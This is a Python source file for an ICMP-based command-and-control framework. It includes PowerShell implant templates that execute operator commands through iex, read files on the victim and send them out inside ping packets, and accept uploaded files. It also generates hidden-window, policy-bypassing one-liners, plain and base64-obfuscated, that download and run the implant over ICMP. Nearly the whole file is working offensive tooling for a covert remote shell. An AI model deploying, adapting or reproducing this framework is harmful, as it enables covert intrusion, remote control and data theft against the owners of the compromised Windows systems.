#!/usr/bin/env python3
from __future__ import annotations
from ctypes import (
    c_uint8, c_uint16,
    c_ubyte, c_short,
    Structure
)
from socket import (
    socket, IPPROTO_ICMP,
    htons, AF_INET,
    SOCK_RAW, SOCK_DGRAM,
    inet_ntoa, inet_ntop,
    gethostbyname,
)
from fcntl import (
    ioctl, fcntl,
    F_GETFL, F_SETFL
)
from os import (
    O_NONBLOCK, write,
    listdir, remove
)
from typing import (
    Any, TypeVar,
    Union, Type,
    Generic
)
from sys import (
    stdout, stdin,
    stderr, argv
)
from argparse import ArgumentParser as Parser
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from os.path import exists, basename
from datetime import datetime
from struct import pack
from select import select

""" COMMON LIB """

_S = TypeVar("_S", bound=Union[str, bytes])
_U = TypeVar("_U", bound=Union[str, bytes, int])


# noinspection PyUnresolvedReferences,PyBroadException
class Common(Generic[_S]):
    @staticmethod
    def hex(value: _S) -> str:
        return hexlify(Common.bytes(value)).decode()

    @staticmethod
    def unhex(value: _S) -> bytes:
        return unhexlify(Common.string(value))

    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%m-%d-%Y_%H-%M-%S")

    @staticmethod
    def string(value: _S) -> str:
        return (
            value.decode()
            if type(value) is bytes
            else str(value)
        )

    @staticmethod
    def bytes(value: _S) -> bytes:
        return (
            value.encode()
            if type(value) is str
            else value
        )

    @staticmethod
    def checksum(value: bytes) -> int:
        remaining, result, idx = len(value), 0, 0
        while remaining > 1:
            result = value[idx] * 256 + (value[idx + 1] + result)
            idx, remaining = idx + 2, remaining - 2
        if remaining == 1:
            result = result + value[idx] * 256
        result = (result >> 16) + (result & 0xFFFF)
        result += (result >> 16)
        result = (~result & 0xFFFF)
        return result

    @staticmethod
    def hostname(address: _S) -> str:
        return gethostbyname(
            address if type(address) is str
            else Common.string(address)
        )

    @staticmethod
    def address(address: _S) -> str:
        return (
            inet_ntop(AF_INET, address)
            if type(address) == c_ubyte * 4
            else Common.string(address)
        )

    @staticmethod
    def unblock(fd: int = -1) -> bool:
        if fd < 0:
            fd = stdin.fileno()
        flags = fcntl(fd, F_GETFL)
        flags = flags | O_NONBLOCK
        fcntl(fd, F_SETFL, flags)
        return True

    @staticmethod
    def default(adapter: bytes = b"eth0") -> str:
        sock = socket(AF_INET, SOCK_DGRAM)
        return inet_ntoa(ioctl(
            sock.fileno(),
            0x8915,
            pack("256s", adapter[:15])
        )[20:24])

    @staticmethod
    def disable() -> bool:
        path: str = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
        try:
            open(path, 'w').write("1")
            return True
        except Exception:
            return False


# noinspection PyBroadException
class Logger(Generic[_S]):
    def __init__(self, **kw):
        self._verbose: bool = kw.get("verbose", False)
        self._raise: bool = kw.get("throw", False)
        self._prompt: bytes = kw.get("prompt", b"> ")
        self.bytes = Common.bytes
        self.string = Common.string
        Common.unblock(stdin.fileno())

    def flush(self) -> Logger:
        stdout.flush()
        return self

    @staticmethod
    def read() -> bytes:
        try:
            return stdin.readline().encode()
        except Exception:
            return b""

    def prompt(self) -> Logger:
        self.flush().write(self._prompt)
        return self

    def write(self, output: _S, out: bool = True) -> Logger:
        if len(output) == 0:
            return self
        (written, output) = (0, self.bytes(output))
        while written < len(output):
            try:
                written += write(
                    (stdout if out else stderr).fileno(),
                    output[written:]
                )
            except OSError:
                pass
        return self

    def error(self, value: Any) -> Logger:
        if bool(self._verbose):
            self.write(f"[!] ERROR: {value}\n", False)
        if issubclass(type(value), Exception):
            if self._raise:
                raise value
        return self

    def info(self, value: _S) -> Logger:
        return self.write(f"{self.string(value)}\n")

    def debug(self, value: Any) -> Logger:
        return (
            self.write(f"[*] DEBUG: {value}\n")
            if self._verbose else self
        )


# noinspection PyBroadException
class Buffer(object):
    _buffer: list[bytes]
    limit: int

    def __init__(self, data: bytes = b"", limit: int = 1024):
        self.limit = limit
        self._buffer = []
        self.load(data)

    @property
    def length(self) -> int:
        return len(self.data)

    @property
    def data(self) -> bytes:
        return b"".join(self._buffer)

    def load(self, data: bytes) -> Buffer:
        try:
            if len(data) == 0:
                return self
            self._buffer: list[bytes] = (
                [data] if len(data) <= self.limit
                else [
                    data[i:i + self.limit]
                    for i in range(0, len(data), self.limit)
                ]
            )
        except Exception:
            pass
        return self

    def get(self) -> bytes:
        chunk: bytes = b""
        try:
            chunk = self._buffer.pop(0)
        except Exception:
            pass
        return chunk

    def put(self, chunk: bytes) -> Buffer:
        try:
            if len(chunk) > 0:
                self._buffer.append(chunk)
        except Exception:
            pass
        return self


class Stream(object):
    def __init__(self, _input: bytes = b"", _output: bytes = b"", limit: int = 1024, *ag, **kw):
        self._in: Buffer = Buffer(data=_input, limit=limit)
        self._out: Buffer = Buffer(data=_output, limit=limit)

    @property
    def remaining(self) -> int:
        return self._out.length

    @property
    def received(self) -> int:
        return self._in.length

    @property
    def output(self) -> bytes:
        return self._out.data

    @property
    def input(self) -> bytes:
        return self._in.data

    def flushIn(self) -> Stream:
        self._in: Buffer = Buffer(limit=self._in.limit)
        return self

    def flushOut(self) -> Stream:
        self._out: Buffer = Buffer(limit=self._out.limit)
        return self

    def load(self, data: bytes, out: bool = True) -> Stream:
        (self._out if out else self._in).load(data)
        return self

    def get(self) -> bytes:
        return self._out.get()

    def put(self, chunk: bytes) -> Stream:
        self._in.put(chunk)
        return self


""" PROTOCOL LIB """


# noinspection PyBroadException,PyAttributeOutsideInit,PyUnresolvedReferences,PyTypeChecker
class Packet(Structure):
    _size: int = 0x0
    _data: bytes = b''
    _address: Any = ''
    _pack_ = 0x01

    def __new__(cls, buffer: bytes, *ag, **kw) -> Packet:
        return cls.from_buffer_copy(buffer)

    def __init__(self, buffer: bytes, *ag, **kw):
        super().__init__()
        self.data = buffer[self.size:]

    @property
    def packet(self) -> bytes:
        return self.header + self.data

    @property
    def header(self) -> bytes:
        return bytes(self)

    @property
    def size(self) -> int:
        return self._size

    @property
    def data(self) -> bytes:
        return self._data

    @data.setter
    def data(self, buffer: bytes):
        self._data = buffer

    @property
    def address(self) -> Any:
        return self._address

    @address.setter
    def address(self, ip: Any):
        self._address = Common.address(ip)


# noinspection PyUnresolvedReferences
class IPv4(Packet):
    _fields_ = [
        ("version", c_uint8, 4),
        ("ihl", c_uint8, 4),
        ("dscp", c_uint8, 6),
        ("ecp", c_uint8, 2),
        ("len", c_uint16),
        ("id", c_uint16),
        ("flags", c_uint16, 3),
        ("offset", c_uint16, 13),
        ("ttl", c_uint8),
        ("proto", c_uint8),
        ("chksum", c_uint16),
        ("src", c_ubyte * 4),
        ("dst", c_ubyte * 4)
    ]
    _size: int = 0x14

    def __init__(self, *ag, **kw):
        super().__init__(*ag, **kw)
        self.address = self.src

    def valid(self) -> bool:
        return (
            ICMP(self.data).valid()
            if self.proto == IPPROTO_ICMP
            else False
        )

    def body(self) -> bytes:
        return ICMP(self.data).body()

    def reply(self, data: bytes) -> IPv4:
        self.data = ICMP(self.data).reply(data).packet
        return self


# noinspection PyAttributeOutsideInit,PyUnresolvedReferences,SpellCheckingInspection
class ICMP(Packet):
    _fields_ = [
        ("type", c_uint8),
        ("code", c_uint8),
        ("chksum", c_uint16),
        ("pkid", c_uint16),
        ("seq", c_short),
    ]
    _size: int = 0x08
    REQUEST: int = 0x08
    REPLY: int = 0x00

    def __init__(self, *ag, **kw):
        Packet.__init__(self, *ag, **kw)

    def valid(self) -> bool:
        return self.type == self.REQUEST

    def body(self) -> bytes:
        return self.data

    def reply(self, data: bytes) -> ICMP:
        self.type = self.REPLY
        self.data = data
        self.code = 0
        self.chksum = 0
        self.chksum = htons(
            Common.checksum(
                self.packet
            )
        )
        return self


""" MODEL LIB """


# noinspection PyBroadException
class Model(Generic[_S]):
    uid: bytes = b"00000000-0000-0000-0000-000000000000"
    delimiter: bytes = b"|"
    separator: bytes = b"\xff"
    key: bytes = b""

    def __init__(
            self,
            address: _S = "",
            uid: bytes = b"00000000-0000-0000-0000-000000000000",
            **kw
    ):
        self.address = Common.string(address)
        self.uid = uid

    @property
    def _type(self) -> str:
        return self.__class__.__name__

    @staticmethod
    def parse(data: list[bytes]) -> bytes:
        result = Model.delimiter.join(data)
        if result != b"\x00":
            return result

    def __str__(self) -> str:
        try:
            items = [
                f"{key}: {Common.string(val)}"
                for (key, val) in self.__dict__.items()
                if type(val) in [int, str, bytes]
            ]
            return f"{self._type} {{{','.join(items)}}}"
        except Exception:
            return str(self)


# noinspection PyBroadException,PyUnresolvedReferences
class Transfer(Stream, Model):
    address: str
    source: str
    destination: str
    log: Logger

    def __init__(self, src: _S = "", dst: _S = "", *ag, **kw):
        Stream.__init__(self, *ag, **kw)
        Model.__init__(self, *ag, **kw)
        _str = Common.string
        self.destination = _str(dst).strip()
        self.source = _str(src).strip()
        if exists(self.source):
            self.read()

    @property
    def name(self) -> str:
        return basename(self.destination)

    def read(self) -> Transfer:
        if not exists(self.source):
            raise Exception(f"File not found")
        return self.load(open(self.source, "rb").read())

    def write(self) -> Transfer:
        if exists(self.name):
            self.destination = f"{Common.timestamp()}_{self.name}"
        open(self.name, "wb").write(self.input)
        return self

    def delete(self) -> Transfer:
        if not exists(self.name):
            raise Exception(f"File not found")
        remove(self.name)
        return self

    def serialize(self, full: bool = False) -> bytes:
        ...

    @staticmethod
    def deserialize(address: str, data: bytes) -> Transfer | None:
        ...


# noinspection PyBroadException,PyUnresolvedReferences
class Download(Transfer):
    key: bytes = b"d-"

    def __init__(self, *ag, **kw):
        Transfer.__init__(self, *ag, **kw)

    def serialize(self, full: bool = False) -> bytes:
        return self.delimiter.join([
            self.key, self.uid,
            Common.bytes(self.source),
            self.output if full else self.get()
        ])

    @staticmethod
    def deserialize(address: str, data: bytes) -> Download | None:
        try:
            if len(data) >= len(Model.uid) and Model.delimiter in data:
                items: list[bytes] = data.split(Model.delimiter)
                return Download(
                    address=address,
                    uid=items[1],
                    dst=items[2],
                    _input=Model.parse(items[3:])
                )
        except Exception:
            return None


# noinspection PyBroadException,PyUnresolvedReferences
class Upload(Transfer):
    key: bytes = b"u-"

    def __init__(self, *ag, **kw):
        Transfer.__init__(self, *ag, **kw)
        self.initialized: bool = False

    def serialize(self, full: bool = False) -> bytes:
        if not self.initialized:
            (data, self.initialized) = (b"", True)
        else:
            data = self.output if full else self.get()
        return self.delimiter.join([
            self.key, self.uid,
            Common.bytes(self.destination.strip()),
            data
        ])

    @staticmethod
    def deserialize(address: str, data: bytes) -> Upload | None:
        try:
            if len(data) >= len(Model.uid) and Model.delimiter in data:
                items: list[bytes] = data.split(Model.delimiter)
                return Upload(
                    address=address,
                    uid=items[1],
                    dst=items[2],
                    _input=Model.parse(items[3:])
                )
        except Exception:
            return None


# noinspection PyBroadException,PyUnresolvedReferences
class Command(Stream, Model):
    key: bytes = b"c-"

    def __init__(self, *ag, **kw):
        Stream.__init__(self, *ag, **kw)
        Model.__init__(self, *ag, **kw)

    def serialize(self, full: bool = False) -> bytes:
        return self.delimiter.join([
            self.key, self.uid, b"",
            self.output if full else self.get()
        ])

    @staticmethod
    def deserialize(address: str, data: bytes) -> Command | None:
        try:
            if len(data) >= len(Model.uid) and Model.delimiter in data:
                items: list[bytes] = data.split(Model.delimiter)
                return Command(
                    address=address,
                    uid=items[1],
                    _input=Model.parse(items[3:])
                )
        except Exception:
            return None


# noinspection PyUnresolvedReferences
_T = TypeVar('_T', object, Type[Command | Download | Upload | None])
_M = TypeVar('_M', bound=Union[Command, Download, Upload, None])


# noinspection PyBroadException
class Shell(Model, Generic[_M, _T]):
    def __init__(self, log: Logger, *ag, **kw):
        Model.__init__(self, *ag, **kw)
        self.queued: list[_M] = []
        self.commands: list[Command] = []
        self.uploads: list[Upload] = []
        self.downloads: list[Download] = []
        self.container: dict[_T, list[_M]] = {
            Command: self.commands,
            Upload: self.uploads,
            Download: self.downloads
        }
        self.pending: list[_S] = []
        self.active: _M = self.default()
        self.log: Logger = log

    def retrieve(self) -> str:
        result: str = "".join([Common.string(msg) for msg in self.pending])
        self.pending: list[_S] = []
        return result

    def update(self, data: _S) -> Shell:
        if Common.string(data) != "":
            self.pending.append(data)
        return self

    def command(self, cmd: _S) -> Shell:
        self.log.debug(f"Executing command: {cmd}")
        self.queued.append(Command(address=self.address, uid=self.uid, _output=Common.bytes(cmd)))
        return self

    def upload(self, src: str, dst: str) -> Shell:
        self.log.debug(f"Uploading: {src} to {dst}")
        self.queued.append(Upload(address=self.address, uid=self.uid, src=src, dst=dst))
        return self

    def download(self, src: str) -> Shell:
        self.log.debug(f"Downloading: {src}")
        dst: str = basename(src.strip().replace("\\", "/"))
        self.queued.append(Download(address=self.address, uid=self.uid, src=src, dst=dst))
        return self

    def complete(self) -> Shell:
        try:
            self.log.debug(f"Completing: {self.active}")
            if not type(self.active) in self.container.keys():
                return self
            self.container.get(type(self.active), []).append(self.active)
            if isinstance(self.active, Download):
                self.active.write()
                self.update(f"[+] {Common.timestamp()} - Downloaded: {self.active.name}\n")
            if isinstance(self.active, Upload):
                self.update(f"[+] {Common.timestamp()} - Uploaded: {self.active.name}\n")
            self.active = self.next()
        except Exception as err:
            self.log.error(err)
        return self

    def default(self) -> Command:
        return Command(uid=self.uid, address=self.address)

    def next(self) -> _M:
        try:
            return self.queued.pop(0)
        except IndexError:
            return self.default()

    def current(self) -> _M:
        try:
            if not type(self.active) in self.container.keys():
                self.active = self.next()
            return self.active
        except IndexError:
            return self.default()

    def incoming(self, request: _M) -> Shell:
        try:
            (data, remaining) = (request.input, self.active.remaining)
            (size, _) = (len(data), request.flushIn())
            if isinstance(request, Command):
                self.update(data)
            if remaining > 0:
                return self
            if size == 0:
                return self.complete()
            if not isinstance(request, type(self.active)):
                self.active = request
            self.active.put(data)
        except Exception as err:
            self.log.error(err)
        return self

    def outgoing(self) -> bytes:
        try:
            return self.current().serialize()
        except Exception as err:
            self.log.error(err)
            return b""


class Template(object):
    templates: dict = {
        "current": 'sal o out-null;sal d sleep;$g="$([guid]::newguid())";$p="";$z=128;$x="";$w="";function b($v){[text.encoding]::ascii.getbytes($v)};function e($v){[char[]]$v-join""};function s($v=""){if(!$x){$global:x="c-|$g||"};$f=b $x;if($v){$f=$f+$v};$global:w=$global:p="";$r=[net.networkinformation.ping]::new().send("ADDRESS",$z*99,$f,[net.networkinformation.pingoptions]::new($z,1)).buffer;if($r){$global:w=(e $r).split("|")[0..2];[byte[]]$r[(($w-join("|")).length+1)..$r.length]}};function a($v){for($i=0;$i-lt$v.length;$i+=$z){s $v[$i..($i+$z-1)]}};s(b "$pwd>")|o;while(1){try{$v=e(s "");if($w){if($w.length-lt2){d 1;continue};$m=$w[2];$n=$w[0];if($n-eq"c-"){$global:x="";if($v){$s=try{iex($v)2>&1|out-string}catch{"$_"};a(b $s)|o;s(b "`n$pwd>")|o}}elseif($n-eq"d-"){$global:x="d-|$g|$m|";a([io.file]::readallbytes($m))|o}elseif($n-eq"u-"){$global:x="u-|$g|$m|";$r=@();while(1){$d=s "";if(!$d){break};$r+=$d};[io.file]::writeallbytes($m,$r)|o};$global:x="";d 1}else{d 1}}catch{d 1}}',
        "legacy": 'sal o out-null;sal n new-object;sal d sleep;$g="$([guid]::newguid())";$p="";$z=128;$x="";$w="";function b($v){[text.encoding]::ascii.getbytes($v)};function e($v){[char[]]$v-join""};function s($v=""){if(!$x){$global:x="c-|$g||"};$f=b $x;if($v){$f=$f+$v};$global:w=$global:p="";$r=(n net.networkinformation.ping).send("ADDRESS",$z*99,$f,(n net.networkinformation.pingoptions $z,1)).buffer;if($r){$global:w=(e $r).split("|")[0..2];[byte[]]$r[(($w-join("|")).length+1)..$r.length]}};function a($v){for($i=0;$i-lt$v.length;$i+=$z){s $v[$i..($i+$z-1)]}};s(b "$pwd>")|o;while(1){try{$v=e(s "");if($w){if($w.length-lt2){d 1;continue};$m=$w[2];$n=$w[0];if($n-eq"c-"){$global:x="";if($v){$s=try{iex($v)2>&1|out-string}catch{"$_"};a(b $s)|o;s(b "`n$pwd>")|o}}elseif($n-eq"d-"){$global:x="d-|$g|$m|";a([io.file]::readallbytes($m))|o}elseif($n-eq"u-"){$global:x="u-|$g|$m|";$r=@();while(1){$d=s "";if(!$d){break};$r+=$d};[io.file]::writeallbytes($m,$r)|o};$global:x="";d 1}else{d 1}}catch{d 1}}'
    }
    commands: dict = {
        "current": "iex([char[]][net.networkinformation.ping]::new().send('ADDRESS',6000,@(0xKEY)).buffer-join'')",
        "legacy": "iex([char[]](new-object net.networkinformation.ping).send('ADDRESS',6000,@(0xKEY)).buffer-join'')"
    }

    def __init__(self, **kw):
        self.log: Logger = Logger(**kw)
        self.address: str = kw.get("address", Common.default())
        self.key: str = kw.get("key", "c0")
        self.mode: str = kw.get("mode", "current")
        self.serve: bool = bool(kw.get("serve", False))
        self._payload = b""
        self._implant = b""
        self._obfuscated = b""

    def clear(self) -> Template:
        self._payload = b""
        self._implant = b""
        self._obfuscated = b""
        return self

    def populate(self, value: str) -> str:
        return value.replace("ADDRESS", self.address).replace("KEY", self.key)

    @property
    def template(self) -> str:
        return self.populate(self.templates.get(self.mode, self.templates.get("current")))

    @property
    def command(self) -> str:
        return self.populate(self.commands.get(self.mode, self.commands.get("current")))

    @property
    def payload(self) -> bytes:
        if not bool(self._payload):
            self._payload = self.template.encode()
        return self._payload.strip() if self.serve else b""

    @property
    def obfuscated(self) -> bytes:
        if not bool(self._obfuscated):
            encoded: str = b64encode(self.command.encode()).decode()
            self._obfuscated = f"iex([char[]][convert]::frombase64string('{encoded}')-join'')"
        return self._obfuscated

    @property
    def implant(self) -> bytes:
        if not bool(self._implant):
            self._implant = f"""
                *Non-obfuscated PS oneliner to download and invoke template via ICMP:
                powershell -ex b -w h -c "{self.command}"

                *Obfuscated PS oneliner to download and invoke template via ICMP:            
                powershell -ex b -w h -c "{self.obfuscated}"
            """.encode()
        return self._implant

    def staged(self, body: bytes) -> bool:
        try:
            if not self.serve:
                return False
            return body == Common.unhex(self.key)
        except Exception as err:
            self.log.error(err)
            return False


""" SERVICE LIB """

_A = TypeVar("_A", bound=Union[Shell, None])


# noinspection PyBroadException
class Service(Generic[_M, _A, _T, _S, _U]):
    def __init__(self, **kw):
        self.container: dict[bytes, _T] = {
            Command.key: Command,
            Download.key: Download,
            Upload.key: Upload,
        }
        self.callbacks: dict[bytes, _A] = {}
        self.callback: _M = None
        self.source: str = ""
        self.log: Logger = Logger(**kw)
        self.uid: _S = ""

    def request(self, address: str, data: bytes) -> Service:
        try:
            self.log.debug(f"Incoming request: {address} {data}")
            self.source, self.callback = (
                address, (
                    self.container.get(data[:2]).deserialize(address, data)
                    if data[:2] in self.container.keys() else None
                )
            )
            if bool(self.callback):
                self.log.debug(f"Valid callback: {self.callback}")
                self.attach().locate(self.callback.uid).incoming(self.callback)
        except Exception as err:
            self.log.error(err)
        return self

    def response(self) -> bytes:
        try:
            self.log.debug(f"Outgoing response to: {self.callback}")
            return (
                self.locate(self.callback.uid).outgoing()
                if bool(self.callback) else b""
            )
        except Exception as err:
            self.log.error(err)
            return b""

    def command(self, uid: bytes, cmd: _S) -> Service:
        try:
            self.log.debug(f"Received command: {cmd} {uid}")
            if uid in self.callbacks.keys():
                (args, callback) = (Common.string(cmd).split(" "), self.locate(uid))
                if args[0] == "put":
                    callback.upload(args[1], args[-1])
                elif args[0] == "get":
                    callback.download(args[1])
                else:
                    callback.command(cmd)
        except Exception as err:
            self.log.error(err)
        return self

    def attach(self) -> Service:
        try:
            if self.callback.uid not in self.callbacks.keys():
                self.callbacks[self.callback.uid] = Shell(
                    log=self.log,
                    address=self.callback.address,
                    uid=self.callback.uid
                )
                (address, uid) = (self.callback.address, self.callback.uid.decode())
                self.log.info(f"[+] {Common.timestamp()} - Connection: IP {address} ID {uid}")
        except Exception as err:
            self.log.error(err)
        return self

    def detach(self, uid: bytes) -> Service:
        try:
            self.log.debug(f"[+] Detaching shell: {uid}")
            if uid in self.callbacks.keys():
                del self.callbacks[uid]
        except Exception as err:
            self.log.error(err)
        return self

    def locate(self, uid: bytes) -> _A:
        try:
            return self.callbacks.get(uid, Shell(log=self.log, address=self.source, uid=uid))
        except Exception as err:
            self.log.error(err)
            return None

    def use(self, uid: _U) -> Service:
        try:
            uid = list(self.callbacks.keys())[int(uid)]
        except:
            uid = Common.bytes(uid)
        if uid in self.callbacks.keys():
            self.log.info(f"[+] Active shell: {uid.decode()}")
            self.uid = uid
            self.retrieve()
            return self
        self.log.info(f"[!] Shell not found: {uid}")
        return self

    def retrieve(self) -> Service:
        try:
            if self.uid in self.callbacks.keys():
                self.log.write(self.callbacks.get(self.uid).retrieve())
        except Exception as err:
            self.log.error(err)
        return self

    def connections(self) -> str:
        connections = ""
        try:
            keys = list(self.callbacks.keys())
            connections = "\n".join([
                f"IDX: {i} - ID: {Common.string(keys[i])}" for i in range(len(keys))
            ])
        except Exception as err:
            self.log.error(err)
        return connections


# noinspection PyPep8Naming,PyBroadException
class Server(Service):
    usage: str = f"""
        [*] Commands / Description:
            get <remote path>               - Downloads remote file to local folder
            put <local path> <remote path>  - Uploads local file to remote path
            shells                          - List all shells/callbacks
            shell                           - Display uid of active shell 
            implant                         - Display PS oneliners for staged payloads
            exit                            - Exit server (leaves shells running)
            use <idx|uid>                   - Use shell by idx or uid                        
            menu                            - Leave shell and go to main menu
            serve                           - Toggle serving the implant from template
            key                             - Set the serve key (one hex byte)
            mode                            - Set the implant mode (current|legacy)
            help                            - Display this menu            
    """

    def __init__(
            self,
            address: str = '',
            external: str = '',
            timeout: int = 3,
            limit: int = 1024,
            **kw
    ):
        Service.__init__(self, **kw)
        self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
        self.timeout = timeout
        self.limit = limit
        self._address = address
        self._external = external
        self.connected = False
        self.template = Template(
            address=self.external,
            **kw
        )

    @property
    def address(self) -> str:
        return self._address if bool(self._address) else Common.default()

    @property
    def external(self) -> str:
        return self._external if bool(self._external) else self.address

    def bind(self) -> Server:
        try:
            if not Common.disable():
                raise Exception(f"Unable to disable echo reply")
            self.sock.bind((self.address, 0))
            self.sock.setblocking(False)
            self.connected = True
        except Exception as err:
            self.log.error(err)
        return self

    def receive(self) -> IPv4 | None:
        try:
            self.log.debug(f"Checking for incoming packet")
            if not self.connected:
                self.log.error(f"Not connected")
                return None
            ready, _, _ = select([self.sock], [], [], self.timeout)
            if not ready:
                return None
            packet, (address, _) = self.sock.recvfrom(self.limit)
            self.log.debug(f"Incoming packet: {address}")
            return IPv4(packet) if address != self.address else None
        except Exception as err:
            self.log.error(err)
            return None

    def send(self, packet: IPv4) -> Server:
        try:
            if not self.connected:
                return self
            self.log.debug(f"Sending packet: {packet.address} {packet.data}")
            self.sock.sendto(packet.data, (Common.hostname(packet.address), 1))
        except Exception as err:
            self.log.error(err)
        return self

    def prompt(self) -> Server:
        if not bool(self.uid):
            self.log.prompt()
        return self

    def process(self) -> Server:
        try:
            command = Common.string(self.log.read())
            if bool(command):
                args = command.strip().split(" ")
                if "shells" == args[0]:
                    self.log.info(self.connections())
                    self.prompt()
                elif "shell" == args[0]:
                    self.log.info(f"[+] Active shell: {self.uid.decode()}")
                    self.prompt()
                elif "exit" == args[0]:
                    self.log.info(f"[!] Stopping service")
                    self.connected = False
                elif "use" == args[0]:
                    self.use(args[1])
                elif "menu" == args[0]:
                    self.uid = b""
                    self.prompt()
                elif "serve" == args[0]:
                    self.template.serve = not self.template.serve
                    self.prompt()
                elif "key" == args[0]:
                    self.template.key = args[1]
                    self.template.clear()
                    self.prompt()
                elif "mode" == args[0]:
                    self.template.mode = args[1]
                    self.template.clear()
                    self.prompt()
                elif "implant" == args[0]:
                    self.log.info(self.template.implant)
                    self.prompt()
                elif "help" == args[0]:
                    self.log.info(self.usage)
                    self.prompt()
                elif bool(self.uid):
                    self.command(self.uid, command)
                else:
                    self.log.info(f"[!] No active shell set").prompt()
        except Exception as err:
            self.log.error(err)
        return self

    def run(self) -> Server:
        self.log.info(f"[+] Starting service on {self.address}")
        self.bind().log.prompt()
        while self.connected:
            try:
                response: IPv4 = self.process().receive()
                if response is None:
                    continue
                self.request(response.address, response.body())
                if not bool(self.callback):
                    if self.template.staged(response.body()):
                        self.log.info(f"Sending payload to {response.address}")
                        self.send(response.reply(self.template.payload))
                    continue
                self.retrieve().process().send(response.reply(self.response()))
            except KeyboardInterrupt:
                self.log.info(f"[!] Stopping service")
                break
        self.log.info(f"[+] Exiting")
        return self


def main(*ag) -> None:
    parser = Parser(
        usage="""            
        [+] Commandline Examples
            {0} -serve -address <address>       - Run in 'serve' mode on specific IP using default key
            {0} -serve -key CC                  - Run in 'serve' mode using default IP and CC as key 
            {0} -verbose -address <address>     - Run in 'verbose' mode for debugging without serving
            {0} -serve -external <address>      - Run in 'serve' mode using external IP (NAT) and default key
            {0} -serve -mode current            - Run in 'serve' mode using default IP and current PS mode 

        [+] Interactive Commands
            get <remote path>               - Downloads remote file to local folder
            put <local path> <remote path>  - Uploads local file to remote path
            shells                          - List all shells/callbacks
            shell                           - Display uid of active shell 
            implant                         - Display PS oneliners for staged payloads
            exit                            - Exit server (leaves shells running)
            use <idx|uid>                   - Use shell by idx or uid                        
            menu                            - Leave shell and go to main menu
            serve                           - Toggle serving the implant from template
            key                             - Set the serve key (one hex byte)
            mode                            - Set the implant mode (current|legacy)
            help                            - Display this menu
        """.format(ag[0]),
        description="""
                                .* ICMP C2 Framework *. 
        A native python3 C2 framework that uses ICMP connections to transmit data.
        Execute staged PS implants via short oneliners on modern Windows systems.
        Supports multiple implants behind NAT networks or same operating system.
        """,
        add_help=True
    )
    parser.add_argument("-serve", action="store_true", help="Enable 'serve' mode to serve staged payloads")
    parser.add_argument("-verbose", action="store_true", help="Enable 'verbose' mode for debugging")
    parser.add_argument("-throw", action="store_true", help="Throw errors instead of catching them")
    parser.add_argument("-mode", action="store", help="Payload template mode to serve (current|legacy)")
    parser.add_argument("-address", action="store", help="IP address to listen for incoming ICMP packets")
    parser.add_argument("-external", action="store", help="External IP address for implants and payloads")
    parser.add_argument("-key", action="store", help="One byte key for serving payloads")
    parser.set_defaults(
        serve=False,
        verbose=False,
        throw=False,
        address="",
        external="",
        mode="current",
        key="c0"
    )
    opts = parser.parse_args()
    try:
        Server(
            verbose=opts.verbose,
            throw=opts.throw,
            serve=opts.serve,
            address=opts.address,
            external=opts.external,
            mode=opts.mode,
            key=opts.key
        ).run()
    except Exception as err:
        stderr.write(f"{err}\n")
        exit(1)
    exit(0)


if __name__ == '__main__':
    # TODO: add color scheme for output, logging of command history, more features (e.g., reflection, other implants)
    main(*argv)
